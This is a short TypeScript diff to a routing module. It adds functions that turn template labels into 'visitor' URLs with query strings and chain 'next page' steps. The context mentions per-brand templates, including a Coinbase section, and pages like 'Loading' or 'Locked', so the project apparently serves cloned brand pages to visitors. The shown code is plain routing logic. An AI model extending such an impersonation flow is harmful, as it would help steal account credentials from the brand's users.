@@ -13,6 +13,7 @@
  * like Loading or Locked).
  */
 import { dbGetSetting } from './database.js';
+import { templateLabelToVisitorPath } from './visitorRouter.js';
 
 export const DEFAULT_NEXT_PAGE: Record<string, string> = {
 	// --- Coinbase ---
@@ -111,6 +112,36 @@ export function labelToUrl(label: string | null | undefined): string | null {
 	return `/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent(page)}`;
 }
 
-export function getNextUrl(brand: string, page: string): string | null {
-	return labelToUrl(getNextLabel(brand, page));
+export function labelToVisitorUrl(
+	label: string | null | undefined,
+	module?: string,
+	queryParams?: URLSearchParams
+): string | null {
+	const path = templateLabelToVisitorPath(label || '', module);
+	if (!path) return null;
+	if (!queryParams?.size) return path;
+	const qs = queryParams.toString();
+	return qs ? `${path}?${qs}` : path;
+}
+
+export interface NextUrlOptions {
+	module?: string;
+	isVisitorHost?: boolean;
+}
+
+export function getNextUrl(
+	brand: string,
+	page: string,
+	queryParams?: URLSearchParams,
+	opts?: NextUrlOptions
+): string | null {
+	const label = getNextLabel(brand, page);
+	const base =
+		opts?.isVisitorHost && opts.module
+			? labelToVisitorUrl(label, opts.module, queryParams)
+			: labelToUrl(label);
+
+	if (!base || !queryParams || opts?.isVisitorHost) return base;
+	const qs = queryParams.toString();
+	return qs ? `${base}?${qs}` : base;
 }
